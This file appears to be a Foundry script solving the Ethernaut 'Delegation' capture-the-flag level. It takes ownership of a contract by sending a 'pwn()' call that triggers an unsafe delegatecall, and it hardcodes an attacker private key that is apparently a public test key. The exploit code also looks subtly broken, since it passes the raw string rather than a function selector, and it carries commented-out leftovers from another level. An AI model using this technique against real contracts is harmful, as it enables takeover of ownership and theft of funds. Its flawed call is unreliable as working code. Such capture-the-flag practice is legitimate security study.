// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Script.sol";
import "../src/DelegateHack.sol";
import "../src/Delegate.sol";

contract DelegateHackScript is Script {
  function setUp() public {}

  function run () public {
    uint256 attackerPrivateKey = vm.envUint("PRIVATE_KEY");
    uint256 deployerPrivateKey = vm.envUint("TEST_DEPLOYER_PRIVATE_KEY");

    // Deploy vulnerable Delegate and Delegation
    vm.startBroadcast(deployerPrivateKey);
    // Delegate delegateContract = Delegate(payable(address(0x4f2Fb9740A9Ac3ABfB2528B7d5b151657D797CCC)));
    Delegation delegationContract = Delegation(payable(address(0x4f2Fb9740A9Ac3ABfB2528B7d5b151657D797CCC)));
    vm.stopBroadcast();


    // Mock attacker
    vm.startBroadcast(0xac0974bec39a17e36ba4a6b4d238ff944bacb478cbed5efcae784d7bf4f2ff80);
    console.log("owner", delegationContract.owner());

    // DelegateHack delegateHackContract = new DelegateHack(address(delegationContract));
    (bool sent, ) = address(delegationContract).call{value: 0.0001 ether}("pwn()");

      // console.log("delegateHackContract", address(delegateHackContract));
    // delegateHackContract.attack();

    console.log("owner", delegationContract.owner());
    // fallbackContract.contribute{value: 0.0001 ether}();
    // console.log("contrib", fallbackContract.getContribution());
    // (bool sent, ) = address(fallbackContract).call{value: 0.0001 ether}("");
    // console.log("sent", sent);
    // console.log("owner",fallbackContract.owner());
    // fallbackContract.withdraw();
    vm.stopBroadcast();

  }
}